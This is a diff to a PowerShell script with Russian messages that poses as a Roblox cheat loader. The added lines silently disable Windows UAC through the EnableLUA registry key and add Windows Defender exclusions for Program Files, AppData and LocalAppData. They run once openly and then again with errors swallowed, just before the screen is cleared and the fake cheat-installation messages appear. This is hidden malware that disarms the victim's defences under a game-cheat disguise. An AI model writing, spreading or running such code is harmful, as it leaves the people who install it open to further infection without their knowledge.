@@ -1,3 +1,60 @@
+# --- БЛОК 1: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---
+
+Write-Host "Отключение UAC..."
+$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
+Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow
+
+# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
+
+# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
+Write-Host "Добавление папок в исключения..."
+try {
+    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
+    Add-MpPreference -ExclusionPath $ProgramFiles
+
+    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+    if (Test-Path $ProgramFilesX86) {
+        Add-MpPreference -ExclusionPath $ProgramFilesX86
+    }
+
+    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+    Add-MpPreference -ExclusionPath $AppData
+
+    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+    Add-MpPreference -ExclusionPath $LocalAppData
+    
+    Write-Host "Исключения добавлены." -ForegroundColor Green
+}
+catch {
+    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
+}
+
+Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
+$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+$uacProperty = "EnableLUA"
+Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
+
+try {
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " \(x86\)", ""
+        Add-MpPreference -ExclusionPath $updpath
+
+        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path $ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        }
+
+        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath $AppData
+
+        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath $LocalAppData
+        }
+        }
+catch {
+}
 Clear-Host
 Write-Host "Запуск загрузчика читов для Roblox..." -ForegroundColor Red
 Start-Sleep -Seconds 2
@@ -30,3 +87,4 @@ Start-Sleep -Seconds 3
 Write-Host ""
 Write-Host "ГОТОВО! ЧИТ в Roblox УСТАНОВЛЕН!" -ForegroundColor Magenta
 Pause
+
